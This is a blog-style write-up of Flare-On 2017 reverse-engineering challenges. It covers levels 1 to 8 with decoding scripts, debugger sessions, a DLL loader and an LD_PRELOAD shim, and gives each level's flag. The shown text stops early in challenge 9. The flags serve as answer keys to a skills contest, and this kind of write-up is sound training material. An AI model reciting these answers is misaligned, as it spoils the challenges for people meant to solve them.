date: 2017-10-13 00:00:00
modified: 2017-10-13 00:00:00
title: FlareOn 4 WriteUps
author: hugsy
category: ctf
cover: assets/images/flareon-2017-header.png
tags: reverse,flareon,windows,pe,linux,elf,arduino,avr

This year, I happened to finally have a chance to be in a good position to play
[Flare-On CTF](https://flare-on.com), a yearly CTF published by [FireEye](https://www.fireeye.com/blog/threat-research/2017/08/fourth-annual-flare-on-challenge.html). This
year's edition offered 12 reverse-engineering challenges to solve in 6 weeks.

This post is mostly a dump of the notes taken during all the challenges. Link to
challenges and scripts are also given.


# Menu #

For quick jump:

| [Level1](#challenge-1)   | [Level2](#challenge-2)  | [Level3](#challenge-3)  | [Level4](#challenge-4)  |
| [Level5](#challenge-5)   | [Level6](#challenge-6)  | [Level7](#challenge-7)  | [Level8](#challenge-8)  |
| [Level9](#challenge-9)   | [Level10](#challenge-10)  | [Level11](#challenge-11)  | [Level12](#challenge-12)  |


All the challenges are in the ZIP file that you
can [download here](https://mega.nz/#F!lVQzXZZQ!bZkK8Q2XkLb0O-RE-hCl1g).


# The Arsenal #

My complete arsenal was (in no particular order):

  * [Modern-IE Windows VM](https://github.com/hugsy/modern.ie-vagrant)
  * [IDA Pro](https://www.hex-rays.com)
    * [IDA SignSrch](https://github.com/nihilus/IDA_Signsrch)
  * [WinDBG](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger)
  * [CFF Explorer](http://www.ntcore.com/exsuite.php)
  * [HxD](https://mh-nexus.de/en/hxd)
  * [PEiD](https://www.aldeid.com/wiki/PEiD)
  * [AIP Monitor](http://www.rohitab.com/apimonitor)
  * [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals)
  * [Binary Ninja](https://binary.ninja)
    * [Binja-AVR](https://github.com/fluxchief/binaryninja_avr)
    * [Binja-covfefe](https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c)
  * GDB + [GEF](https://github.com/hugsy/gef)
  * [SimAVR](https://github.com/buserror/simavr)
  * [JDB](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jdb.html)
  * [JADX](https://github.com/skylot/jadx)
  * [GenyMotion](https://www.genymotion.com)
  * Python modules:
     * [Python-IntelHex](https://pypi.python.org/pypi/IntelHex)
     * [PyCrypto](https://pypi.python.org/pypi/pycrypto)
     * [Python-Camellia](https://pypi.python.org/pypi/python-camellia/0.1.1)
     * [Python-LZO](https://pypi.python.org/pypi/python-lzo/1.11)
     * [Python-ApLib](https://github.com/secretsquirrel/the-backdoor-factory/blob/master/aPLib/contrib/python/aplib.py)
  * [DnSpy](https://github.com/0xd4d/dnSpy)
  * [Interactive Delphi Reconstructor](https://github.com/crypto2011/IDR)
  * [Wireshark](https://wireshark.org)
  * [Diaphora](https://github.com/joxeankoret/diaphora)
  * [xdotool](http://www.semicomplete.com/projects/xdotool)


And a lot of C and Python snippets...


# Challenge 1 #

## Instruction ##

```text
Welcome to the Fourth Flare-On Challenge! The key format, as always, will be a
valid email address in the @flare-on.com domain.
```

## Solution ##

By checking the [HTML source
code](https://mega.nz/#!1EQhhLrT!uWOWRRGc-8Lx2D0iLxkSk3qMSK-xcWBV8Pnj8CYTaRg),
we see:

![image_alt](/assets/images/flareon-2017/17161f3635f37c0b278c18262e4a29eb4f21675316ff9a086557e390ca3be67e.png)

Classic ROT-13, can be decoded by:

```python
>>> "PyvragFvqrYbtvafNerRnfl@syner-ba.pbz".decode("rot13")
ClientSideLoginsAreEasy@flare-on.com
```


[Back to Menu](#menu)


# Challenge 2 #

## Instruction ##

```text
You solved that last one really quickly! Have you ever tried to reverse engineer
a compiled x86 binary? Let's see if you are still as quick.
```

## Solution ##

[`IgniteMe.exe`](https://mega.nz/#!gBIF0aYQ!82SWKCVa3hw2sI3f_2AsaHaoVwj2zux5ORXXfNMi2F4)
is a small PE that reads
what a buffer from stdin and chain-xor it in reverse (with an IV set to `4` by
function at 0x00401000) and then compared to an `encoded_key` located at
0x0403000:

```text
00403000  0d 26 49 45 2a 17 78 44-2b 6c 5d 5e 45 12 2f 17  .&IE*.xD+l]^E./.
00403010  2b 44 6f 6e 56 09 5f 45-47 73 26 0a 0d 13 17 48  +DonV._EGs&....H
00403020  42 01 40 4d 0c 02 69 00                          B.@M..i.
```

It's a classic simple XOR encoding challenge, the script [IgniteMe.py](https://gist.github.com/f84ad968d233699bfe47b81d7b7e73dc) was
used to decode it :

```bash
$ py IgniteMe.py
[...]
result R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com
```

[Back to Menu](#menu)


# Challenge 3 #


## Instruction ##

```
Now that we see you have some skill in reverse engineering computer software,
the FLARE team has decided that you should be tested to determine the extent of
your abilities. You will most likely not finish, but take pride in the few
points you may manage to earn yourself along the way.
```

## Solution ##

[`greek_to_me`](https://mega.nz/#!4cpGWS5S!QCTrpXnC8q4WYnMHaxbqFA4mPDOVC4q2toAYGKSfe68) is a PE file that will
start by binding and listen tcp/2222, and receive 4 bytes from the socket. This
value read will be used to decode the instructions at 0x40107c to 0x4010ee:

![image_alt1](/assets/images/flareon-2017/489d77b797f222ef52533b5da295fd7e733c9156ec43cbd44aa1f8163ece1f81.png)

Being lazy, I've reconstructed
[this C script](https://gist.github.com/7c7ee0e9cd9399a5ec975a72cfe58486) from
IDA decompiler which allowed me to perform simply a brutefore locally:

```bash
$ make greek_to_me
$ ./greek_to_me
Starting new process 31673 with range(0, 0x20000000)
[...]
Found valid key: 536871074
Found valid key: 1610612898
Found valid key: 1073741986
```

With those keys, we can re-run the binary by sending those value (properly
encoded) to the socket on tcp/2222:

```python
import socket, sys, struct
valid_keys = [162, 536871074, 1610612898, 1073741986]
def p32(x): return struct.pack("I", x)
s = socket.socket()
s.connect(("127.0.0.1", 2222))
s.send(p32(int(sys.argv[1])))
print s.recv(0x100)
```

which will show as a response:

```
Congratulations! But wait, where's my flag?
```

But by setting WinDBG to break at 0x040107c and by passing the correct decoding
key when prompted, a whole new code shows up:

![image_alt](/assets/images/flareon-2017/05d0733685c70aa9802ace1c97c240ace73a3c18c941219d975775cae32d10a5.png)

Revealing the key to this level.

[Back to Menu](#menu)


# Challenge 4 #


## Instruction ##

```
You're using a VM to run these right?
```

## Solution ##

This challenge was very fun at the beginning, but the last part really sucked:
[`notepad.exe`](https://mega.nz/#!IZA3nbLK!qdpuFX29rpXHBfEdXRWMq5R-gHw-5QHiN9cAMhx2vsk) is a small PE that by all
appearance spawns Windows classic `notepad`. I was fooled for a bit at first by
the instruction to this challenge, I expected a malware or something hostile,
but it is nothing of the sort. Disassembling the `start` in IDA shows a bunch of
interesting strings:

![image_alt](/assets/images/flareon-2017/c2be22c2350ecf3a792cfa07a72ee0c6a55e129e60642577e70994e53c3e2efd.png)

```
%USERPROFILE%\flareon2016challenge
ImageHlp.dll
CheckSumMappedFile
User32.dll
MessageBoxA
```

So I created the folder `flareon2016challenge` and spawned `procmon`:

![image_alt](/assets/images/flareon-2017/9e3fc6079d951d311ad3bacdee5d98d5d191b63663d7803e93ec1f260cbde521.png)

clearly showing that `notepad` is looking for something in this
directory. Breaking
on
[`Kernel32!FindFirstFile`](https://msdn.microsoft.com/en-us/library/windows/desktop/aa364418(v=vs.85).aspx)
we discover that the loop at 0x10140B0 performs
a
[classic file lookup in directory](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365200(v=vs.85).aspx),
and calling the function at 0x1014E20 when a file is found. That's where stuff
gets interesting.

![image_alt]/assets/images/flareon-2017/d9d6b730545915c4d7a94f05ff7b42ab7b5ba9fa5a9bc119147d6a35dd357c18.png)

`notepad` maps the file in memory, checks if it started with `MZ`, gets the
value at offset 0x3c, then jump to
the offset and checks if the mmaped memory at this offset is equal to `PE`. It
looks like it is searching for one or more valid PE executables in the
`flareon2016challenge` folder. It does a few extra checks (is it Intel machine
in PE header, etc.) and if everything passes, calls 0x010146C0.

This function will take the timestamps from
the
[PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v=vs.85).aspx)
of the current program (`notepad.exe`) and the PE file mapped to memory. If
those 2 values are the ones expected, then 2 functions are called successively:

 1. Function @ 0x1014350 which will format the timestamp of the mapped file and
 `MessageBox`-it ![image_alt](/assets/images/flareon-2017/3321b96da80e52cd9e26eda05122bb1bd58a18216d6aeb1b4205162d2ed6dbf6.png)
 1. Function @ 0x1014BAC which will open a file `key.bin` in
    `flareon2016challenge` folder and write 8 bytes from some offset
    in the mapped file into it.



Or in horrible pseudo-code:

```python
encoded_buffer = [0x37, 0xe7, 0xd8, 0xbe, etc..]  # populated at 010148F3

if notepad.pe.timestamp == '2008-04-13 11:35:51' and mmap.pe.timestamp == '2016-09-08 11:49:06':
   MessageBox('2016-09-08 11:49:06')
   Write_8_Bytes_From(src=mmap, dst=`key.bin`)

elif notepad.pe.timestamp == '2016-09-08 11:49:06' and mmap.pe.timestamp == '2016-09-09 05:54:16':
   MessageBox('2016-09-09 05:54:16')
   Write_8_Bytes_From(src=mmap, dst=`key.bin`)

elif notepad.pe.timestamp == '2016-09-09 05:54:16' and mmap.pe.timestamp == '2008-11-10 01:40:34':
   MessageBox('2008-11-10 01:40:34')
   Write_8_Bytes_From(src=mmap, dst=`key.bin`)

elif notepad.pe.timestamp == '2008-11-10 01:40:34' and mmap.pe.timestamp == '2016-07-31 17:00:00':
   MessageBox('2016-07-31 17:00:00')
   Write_8_Bytes_From(src=mmap, dst=`key.bin`)

elif notepad.pe.timestamp == '2016-07-31 17:00:00':
   key = ReadFileContent('key.bin')
   assert len(key) == 0x20
   decoded_key = DecodeWithKey( encoded_buffer, key )
   MessageBox(decoded_key)
```

So now we know how the decoding key is built, but we don't know which PE to
use. This guessing game made me lose too much time. The hint was to use 2016 PE
files from last year's FlareOn challenge.

In the many folders of
the [FlareOn3 archive](http://flare-on.com/files/Flare-On3_Challenges.zip)
(pass: flare), we could find several PE files whose timestamps match perfectly
with the ones we are looking for. All we need now is drop those files in the
`flareon2016challenge` directory, and tweak `notepad.exe` to update its
timestamp. After 4 executions we get the `key.bin` file properly filled:

```
➜  xd ~/ctf/flareon_2017/4/key.bin
00000000  55 8b ec 8b 4d 0c 56 57  8b 55 08 52 ff 15 30 20  |U...M.VW.U.R..0 |
00000010  c0 40 50 ff d6 83 c4 08  00 83 c4 08 5d c3 cc cc  |.@P.........]...|
00000020
```

And after updating `notepad` to the last PE timestamp, we get:

![image_alt](/assets/images/flareon-2017/fe5e80d5dd81c1350413732f30ed5ba2b2e4ae1cf92b00504fa6a0bba1b9a820.png)


[Back to Menu](#menu)


# Challenge 5


## Instruction ##

```
You're doing great. Let's take a break from all these hard challenges and play a little game.
```

## Solution ##

[`pewpewboat.exe`](https://mega.nz/#!pdgDDITS!CCXq80gh7M2YxOosfdd_jKXG2N9uUSG_1_5NLY_rbFg) is not a PE file but an
x64 ELF that starts a nice ASCII implementation
of [the Battleship game](https://en.wikipedia.org/wiki/Battleship_(game)).

```
root@kali2:/ctf/flareon_2017/5 # ./pewpewboat.exe
Loading first pew pew map...
   1 2 3 4 5 6 7 8
  _________________
A |_|_|_|_|_|_|_|_|
B |_|_|_|_|_|_|_|_|
C |_|_|_|_|_|_|_|_|
D |_|_|_|_|_|_|_|_|
E |_|_|_|_|_|_|_|_|
F |_|_|_|_|_|_|_|_|
G |_|_|_|_|_|_|_|_|
H |_|_|_|_|_|_|_|_|

Rank: Seaman Recruit

Welcome to pewpewboat! We just loaded a pew pew map, start shootin'!

Enter a coordinate:
```

The binary starts by initializing the PRNG with the current timestamp, then
allocated a 0x240 in the heap, and starts populating it randomly. It then enters
a loop of game, where the player (us) have 0x64 attempts to win the game.

![image_alt](/assets/images/flareon-2017/c1042765b377b68599461aa2c7fbabeb502f831a49db09cb5bb6223a22c99bce.png)

Inside the loop, the function `play()` (at 0x4038d6) is called and will print the game grid
and display whether your shot was hit or miss. The coordinates themselves are
read from the function `enter_coor()` (at 0x40377d).

![image_alt](/assets/images/flareon-2017/aea95f918e61631fae4e6fe1d003951d1fc30d7fcf0e8ac787b14983e264c876.png)

So if we want to win, we need to

  1. disable the randomness of the game board
  1. determine which values are being compared when we set coordonates

To disable the randomness, I simply used `LD_PRELOAD` variable against a
homemade shared library that will override calls to `rand()` and `rand()` to a
deterministic output:

```c
// Compile with : $ gcc -shared -fPIC disable_time.c -o disable_time.so

// Load in GDB with: gef➤  set environment LD_PRELOAD=disable_time.so

#include <time.h>

#include <stdlib.h>

time_t time(time_t *t){ return 0; }
int rand(void){ return 0; }
```

With randomness out of the way, our board game with the position of all the
ships will be the same at every runtime.

The function `draw_grid()` called with a pointer to the game board as
parameter. By reading it, the function knows how to print a cell (empty, full)
and therefore knows the configuration of the board.

```
gef➤  bp *0x403c3a
gef➤  dps $rdi l1
0x0000000000614010│+0x00: 0x0008087808087800	 ← $rax, $rdi
```

This is a bitmask representing the position of the board: to make easier I wrote
a Python function to convert this value into a list of position on the board:

```python
>>>  def convert_to_solution(rdi):
        line = bin(rdi)[2:].rjust(64,'0')
        table = [line[i:i+8] for i in range(0, len(line), 8)][::-1]
        for i in range(len(table)):
            row = table[i][::-1]
            for j in range(len(row)):
                if row[j] == '1':
                    print("%c%c " % ( chr(i+ord('A')), str(j+1)), end="")
                else:
                    print("   ", end="")
            print("")

>>> convert_to_solution(0x0008087808087800)

         B4 B5 B6 B7
         C4
         D4
         E4 E5 E6 E7
         F4
         G4

>>>
```

We get 2 things: one, we have all the positions for the ennemi boats; two, the
disposition of the boats on the board forms an ASCII letter (here 'F').

By advancing through all the levels, we can collect more letters:

   1. 0x0008087808087800 →  "f"
   1. 0x008888f888888800 →  "h"
   1. 0x7e8181f10101817e →  "g"
   1. 0xf090909090000000 →  "u"
   1. 0x0000f8102040f800 →  "z"
   1. 0x0000000905070907 →  "r"
   1. 0x7010701070000000 →  "e"
   1. 0x0006090808083e00 →  "j"
   1. 0x1028444444000000 →  "v"
   1. 0x0c1212120c000000 →  "o"

Reaching the final level and entering the valid positions of boats gets a
message:

```
Final answer:
Aye! You found some letters did ya? To find what you're looking for, you'll want to
re-order them:
9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4.

Next you let 13 ROT in the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE.

Thanks for playing!
```

By simply applying this formula, we find the result to be `ohgjurervfgurehz`
which when in uppercase ROT13-ed gives `BUTWHEREISTHERUM`. Give this password as
input, and after a bit of computation time obtain the key to finish the level:

![image_alt](/assets/images/flareon-2017/532e605c764a754f32dbb0d2581913dbf0283d76e21f12cbf92841cfae67f8c4.png)

[Back to Menu](#menu)


# Challenge 6


## Instruction ##

```
I hope you enjoyed your game. I know I did. We will now return to the topic of
cyberspace electronic computer hacking and digital software reverse
engineering.
```

## Solution ##

[`payload.dll`](https://mega.nz/#!Nd5g3ToA!ArZp4KMqteCSQQwywP2LE-xdYly-UoQEBoig4CfCuIY) is a PE32+ DLL x86-64. The
DLL doesn't sweat much info out of the box, so I decide to use both dynamic and
static analysis. Although the static part is perfectly handled by IDA, I wanted
the dynamic analysis to be custom so I had to make a small loader for this
library.

Since the notation
is [stdecl](http://www.agner.org/optimize/calling_conventions.pdf), the
arguments are passed to registers in the following order: rcx, rdx, r8, r9

```c
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#define DLL_LOCATION TEXT("F:\\flareon_2017\\6\\payload.dll")

typedef void (__stdcall *FuncType)(uint64_t, uint64_t, uint64_t, uint64_t);

/* Call the location at `addr` with [a1 .. a4] as arguments. */
void CallWithArgs(uintptr_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4)
{
    PrintDebug("[+] calling %1!p!\n", (va_list*)&addr);
    DebugBreak();
    ((FuncType)(addr))(a1,a2,a3,a4);
}

/* Print debug message directly in WinDBG. */
VOID PrintDebug(LPTSTR pMsgFmt, va_list* pArgs)
{
    CHAR pMsg[128] = {0,};
    FormatMessage(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY,
                  pMsgFmt, 0, 0, pMsg, sizeof(pMsg), (va_list*)pArgs);
    OutputDebugString(pMsg);
    return;
}

/* main() */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
        HMODULE handle = LoadLibraryEx(DLL_LOCATION, NULL, 0);
        PrintDebug("[+] DLL allocated at %1!p!\n", (va_list*)&handle);
        DebugBreak();
        /* do more stuff here */
        FreeLibrary(handle);
        return 0;
}
```

With this simple library loader, I have an accurate way of invoking any location
withing the DLL and display runtime information directly inside WinDBG.

IDA quickly pointed me to the function at offset 0x5A50 - which I've called
`Func3()`. The loop at 0x180005B05 is a simple `strcmp()` like loop comparing
`arg1` (that we control) to a value from the DLL.

When WinDBG break at this location, we can get the value of the value our
argument is compared to:

```c
0:000> bp payload+0x5b05
0:000> g
Breakpoint 0 hit
payload+0x5b05:
000007fe`f38e5b05 0fb610          movzx   edx,byte ptr [rax] ds:000007fe`f38e4240=6f
0:000> da rax
000007fe`f38e4240  "orphanedirreproducibleconfidence"
000007fe`f38e4260  "s"
```

Using the loader, we can now invoke this function easily:

```c
        // inside WinMain

        uintptr_t Func3 = handle + 0x5A50 ;
        PCHAR a3 = "orphanedirreproducibleconfidences";
        CallWithArgs(Func3, 0, 0, a3, 0);
```

Which when compiled and executed triggers to display the following MessageBox:

![image_alt](/assets/images/flareon-2017/eaca6198b81df65f296bc6d280437944ee7745fae6c9168d2500b12d0a5c1345.png)

We get one letter of the key! Good start, but how could we get more? And why do
we get the 26th character? To know that we must understand the function
0x180005D30:

![image_alt](/assets/images/flareon-2017/a686c1bd8e99734457a6cec1549cfdb8218e5ebaa9e62e412110bb9a9062508e.png)

This function gets a pointer to
the
[Export Directory table](http://resources.infosecinstitute.com/the-export-directory/) then
calls the function 0x180004710:

```
.text:000000018000471E mov     [rsp+48h+var_18], rax
.text:0000000180004723 lea     rcx, [rsp+48h+SystemTime] ; lpSystemTime
.text:0000000180004728 call    cs:GetSystemTime
.text:000000018000472E movzx   eax, [rsp+48h+SystemTime.wMonth]
.text:0000000180004733 movzx   ecx, [rsp+48h+SystemTime.wYear]
.text:0000000180004738 add     eax, ecx
.text:000000018000473A cdq
.text:000000018000473B mov     ecx, 1Ah
.text:0000000180004740 idiv    ecx
.text:0000000180004742 mov     eax, edx
```

Or better in pseudo-code

```c
GetSystemTime(&SystemTime);
return (SystemTime.wYear + SystemTime.wMonth) % 0x1a;
```

Since FlareOn goes from September 2017 to October 2017, the possible return
values are 24 if executed in September, or 25 if in October. We know why we
got `key[25]` now, but we don't know where the passphrase comes from. This is
done in the function 0x180005C40 that will do the decoding of a part of `.rdata`
at index given by the return of function 0x180004710.

So to get the keys, we must decode all sections in `.rdata`:

```c
for (int i=0; i<=24; i++){
  uint64_t DecodeRdataFunc = 0x5D30;
  uintptr_t addr = handle + DecodeRdataFunc;
  CallWithArgs(addr, i, p2, p3, p4);
}
```

The following passphrases are collected:

```c
PCHAR pPasswords[] = {
        "filingmeteorsgeminately",
        "leggykickedflutters",
        "incalculabilitycombustionsolvency",
        "crappingrewardsanctity",
        "evolvablepollutantgavial",
        "ammoniatesignifiesshampoo",
        "majesticallyunmarredcoagulate",
        "roommatedecapitateavoider",
        "fiendishlylicentiouslycolouristic",
        "sororityfoxyboatbill",
        "dissimilitudeaggregativewracks",
        "allophoneobservesbashfulness",
        "incuriousfatherlinessmisanthropically",
        "screensassonantprofessionalisms",
        "religionistmightplaythings",
        "airglowexactlyviscount",
        "thonggeotropicermines",
        "gladdingcocottekilotons",
        "diagrammaticallyhotfootsid",
        "corkerlettermenheraldically",
        "ulnacontemptuouscaps",
        "impureinternationalisedlaureates",
        "anarchisticbuttonedexhibitionistic",
        "tantalitemimicryslatted",
        "basophileslapsscrapping",
        "orphanedirreproducibleconfidences"
};
```

And then force calling the `Func3()` function with the specific password:

```c
addr = mz + Func3;
p3 = (uint64_t)pPasswords[i];
CallWithArgs(addr, p1, p2, p3, p4);
```

That will print out successively the key parts via successive `MessageBox` calls.
```
0x77, 0x75, 0x75, 0x75, 0x74, 0x2d, 0x65, 0x78, 0x70, 0x30, 0x72, 0x74,
0x73, 0x40, 0x66, 0x6c, 0x61, 0x72, 0x65, 0x2d, 0x6f, 0x6e, 0x2e, 0x63,
```

which translated gives `wuuut-exp0rts@flare-on.com`

[Back to Menu](#menu)



# Challenge 7


## Instruction ##

```
I want to play another game with you, but I also want you to be challenged
because you weren't supposed to make it this far.
```

## Solution ##


[`zsud.exe`](https://mega.nz/#!BQIlHJ6Z!_-qOpHyiXaZqq2CV_o42du5blCGmkzrlJKrXs6WG2oU) is a PE32 binary. Running
`strings` and `binwalk` against it immediately shows 2 things:

  1. this binary is C# compiled
  1. it embeds a DLL

```
$  binwalk zsud.exe

DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             Microsoft executable, portable (PE)
[...]
356528        0x570B0         Microsoft executable, portable (PE)
362328        0x58758         Base64 standard index table
```

This DLL, `flareon.dll`, can be easily extracted with a simple `dd` command, and
shows some strings like "`soooooo_sorry_zis_is_not_ze_flag`", but not really
interesting (yet). Debugging the binary with `dnSpy` gives a whole new view as to what
it's doing: the function `Smth()` receives a Base64 encoded string, which once decoded is
AES decrypted with the key "`soooooo_sorry_zis_is_not_ze_flag`". The result is a
Powershell script that is being invoked, and that is another maze game, entirely
written in Powershell. The script can be downloaded [here](https://gist.github.com/750558c5ed49c291e50dc460821e8e09).

![image_alt](/assets/images/flareon-2017/090d3fe35ac25fcec9052f0e216f72c75da6d96a367abe4451d04ff0af7ad5cd.png)

The game is an escape room, so it would make sense that the flag will be given
to us if we escape! And since it's a maze, we need to find the proper
directions, which comes into 2 parts.


### First part of the directions ###

Getting the first part of the directions is relatively simple. `zsud.exe` starts
a webservice
on
[127.0.0.1/9999](https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L814)
so it is possible to bruteforce the first directions by generating HTTP requests
and analysing the output:

```python
def send(directions, description, verbose=False):
    url = "http://192.168.221.4:9998/some/thing.asp?k={k:s}&e={e:s}".format(k=directions, e=description)
    h = requests.get(url)
    if h.status_code==200 or "@" in h.text: return h.text
    return None

key_directions = {0: "n", 1:"s", 2:"e", 3:"w", 4:"u", 5:"d" }
directions = ""
d = key_desc.split()[-1]
prefix = []
i = 0

while True:
    valid = False
    for c in key_directions.keys():
        temp = directions + key_directions[c]
        desc = d.replace('+', '-').replace('/', '_').replace('=', '%3D')
        p = send(temp, desc)
        if p:
            directions = temp
            p, s = p.split()
            prefix.append(p)
            print("[!] dir='%s' prefix='%s' next='%s...'" % (directions, ' '.join(prefix), s[:16]))
            d = s
            valid = True
    if not valid:
        break
    i+=1
```

And we start getting the beginning of the path:
![image_alt](/assets/images/flareon-2017/304507dabd5f847b7beafec89b19e225540db7649cedfc0e2ebe4703df14a06b.png)

```python
directions ='wnneesssnewne'
prefix = 'You can start to make out some words but you need to follow the'
```


### Second part of the directions ###

By following the directions found above, we end up in the "infinite maze of
cubicles"
([confirmed by the PowerShell script](https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L148)). The
cubicles are linked through random connections to one another. To find the way,
we must be able to predict the
generation. At
[line 431](https://gist.github.com/hugsy/750558c5ed49c291e50dc460821e8e09#file-decoded-ps1-L431-L432) we
see that if we transfer the key (located in the desk drawer), the script will
trigger a call to `srand(42)`. The implementation of `msvcrt::rand()` is an
known algorithm that goes along the lines of

```python
seed = 42
def rand():
    global seed
    new_seed = (0x343fd * seed + 0x269ec3) & ((1 << 32) - 1)
    randval = (new_seed >> 0x10) & 0x7fff
    seed = new_seed
    return randval
```

Which now makes the path predictable, and we get the final directions:

```python
directions += 'ewwwdundundunsuneunsewdunsewsewsewsewdun'
```


### Final wrap-up ###

If we now follow the entire directions found above `wnneesssnewne` +
`ewwwdundundunsuneunsewdunsewsewsewsewdun`, we get the final message
`RIGHT_PATH!@66696e646b6576696e6d616e6469610d0a`, so the complete answer to the
maze is

```python
directions ='wnneesssnewneewwwdundundunsuneunsewdunsewsewsewsewdun'
prefix = 'You can start to make out some words but you need to follow the RIGHT_PATH!@66696e646b6576696e6d616e6469610d0a'
```

But still no flag. The hex-encoded block right nexto `RIGHT_PATH` says to:

```python
>>> "66696e646b6576696e6d616e6469610d0a".decode('hex')
'findkevinmandia\r\n'
```

By going back to the Powershell script using Powershell ISE, we notice that the
only place Kevin is mentioned is in the function `Invoke-Say()`. We then seek the function
`Invoke-Say()` and force the `if` branch to be taken by setting the `$helmet`
variable to not None, and the `$key` to the path we found:

```perl
$key = "You can start to make out some words but you need to follow the RIGHT_PATH!@66696e646b6576696e6d616e6469610d0a"
$helmet = 1;
```

Then execute only this portion of code to see:

![image_alt2](/assets/images/flareon-2017/dededfb9d354408d37fab58d50b62856c51ef5a3326ab05a42470df936f6dbf1.png)

Which unhexlified gives the flag:

```python
>>> "6d756464316e675f62795f7930757235336c706840666c6172652d6f6e2e636f6d".decode('hex')
mudd1ng_by_y0ur53lph@flare-on.com
```


[Back to Menu](#menu)


# Challenge 8

## Instruction ##

```
You seem to spend a lot of time looking at your phone. Maybe you would finish a mobile challenge faster.
I want to play another game with you, but I also want you to be challenged
because you weren't supposed to make it this far.
```

## Solution ##

This really fun challenge offers an Android APK
file, [`flair.apk`](https://mega.nz/#!xFoXkTRa!L3h7J_copL4NuA3pEW0bR5Acrz7LeLXVFTV2sb_Ha08). The static analysis was
exclusively done with JADX and I used the awesome GenyMotion + JDB for the dynamic analysis.

This app presents itself as a traditional Android app, `com.flare_on.flair`:

![image_alt](/assets/images/flareon-2017/638b63ff20d2447bdcf9ca2f7dbf3e9a8800178722580185a0c9c7f86652f707.png)

You can get the final flag by solving the 4 mini challenges:

    1. Micheal
    2. Brian
    3. Milton
    4. Printer


### 1. Michael ###

Using `JADX`, we can reach easily the method `simply solve com.flare_on.flair.Michael.checkPassword()`:

![image_alt](/assets/images/flareon-2017/ad3a22fa907e8c8185c87b256bfc4fa542c68eb5dfcc508d4ea8620adab9d859.png)

Which trivially gives us the first answer: `MYPRSHE__FTW`


### 2. Brian ###

Using `jdb`, it is possible to break at any location inside a running Android
app. JADX shows that when the validation button is clicked on, the method
`com.flare_on.flair.Brian.teraljdknh()` is called and checked for success. This
function is a simple `memcmp()`-like function, so we can break on it and dump
its arguments:

```
$ jdb -attach localhost:8700
> methods com.flare_on.flair.Brian
[...]
com.flare_on.flair.Brian dfysadf(java.lang.String, int, java.lang.String,java.lang.String)
com.flare_on.flair.Brian teraljdknh(java.lang.String, java.lang.String)
[...]
> stop in com.flare_on.flair.Brian.teraljdknh
(when break hits)
> locals
Method arguments:
v = "AAAA"
Local variables:
m = "hashtag_covfefe_Fajitas!"
```

We get the answer: `hashtag_covfefe_Fajitas!`


### 3. Milton ###

In the `Milton` class, we can see that the input field is not enabled unless the
rating is equal to 4 (i.e. give 4 stars).

The `onClick` event will call the method `breop(<given_password>)`. That method
will compare our input with the result of the call to the function
`nbsadf()`. `nbsadf()` does nothing but call `Stapler.poserw()`.
So let's break on that with jdb:
```
> stop in com.flare_on.flair.Stapler.poserw
(wait for it)
> main[1] dump intr
 intr = {
 65, 32, 114, 105, 99, 104, 32, 109, 97, 110, 32, 105, 115, 32, 110, 111, 116,
 104, 105, 110, 103, 32, 98, 117, 116, 32, 97, 32, 112, 111, 111, 114, 32, 109,
 97, 110, 32, 119, 105, 116, 104, 32, 109, 111, 110, 101, 121, 46
 }
> stop in java.util.Arrays.equals(byte[], byte[])
```

The variable `intr` holds our answer: `A rich man is nothing but a poor man with
money.` Once decoded, we see that `Stapler.poserw()` is nothing more than a SHA1
checksuming function.

So the answer is

```python
>>> import hashlib
>>> hashlib.sha1('A rich man is nothing but a poor man with money.').hexdigest()
10aea594831e0b42b956c578ef9a6d44ee39938d
```


### 4. Printer ###

The check in the `Printer` class takes the same principles than the ones covered
in `Milton`. After deobfuscation, we can see that the check is also performed
against `Stapler.poserw()`.

So use jdb to break and dump the values
```
> stop in java.util.Arrays.equals(byte[], byte[])
> stop in com.flare_on.flair.Stapler.poserw
```

And we get:
```python
>>> import hashlib
>>> hashlib.sha1("Give a man a fire and he'll be warm for a day. Set a man on fire and he'll be warm for the rest of his life.")
5f1be3c9b081c40ddfc4a0238156008ee71e24a4
```


And finally:

![image_alt](/assets/images/flareon-2017/7ecf50b91265cdd05f48d3910c20c9d48899a3e19645fbe263f8c34a696d00cc.png)



[Back to Menu](#menu)


# Challenge 9



## Instruction ##

```
One of our computer scientists recently got an Arduino board. He disappeared for
two days and then he went crazy. In his notebook he scrawled some insane
jibberish that looks like HEX. We transcribed it, can you solve it?
```


## Solution ##

The challenge is in a text file
named [`remorse.ino.hex`](https://mega.nz/#!NFQwXKYQ!OhtgRSr6U4yRBMnflhIwGgMZJXYaEeMnJG-1m0bWFJ4). This format
(Intel HEX)
is frequently used for sharing encoded firmwares, and so the `python-intelhex`
module provides a useful script to convert it back to binary
(`hex2bin.py`). From the string inside the firmware, we learn that this firmware
is meant to be
used on
a [Arduino Uno board](https://www.arduino.cc/en/Main/arduinoBoardUno/). This
board embeds an Atmel AVR 8bit CPU, running at 16MHz. Easily
enough, Google points us to the [datasheet of the processor.](https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf)
Being totally new to AVR, I stop the challenge at that point for long enough to
read a good part of the datasheet, which proved to be extremely useful for the
rest of this exercise.

With a much better understanding of AVR, I setup a SimAVR environment and also
compiled `simduino`, which allows me to connect a GDB to it, and debug the runtime:

```bash
$ obj-x86_64-linux-gnu/simduino.elf -d -v -v ../../../remorse.ino.hex
```

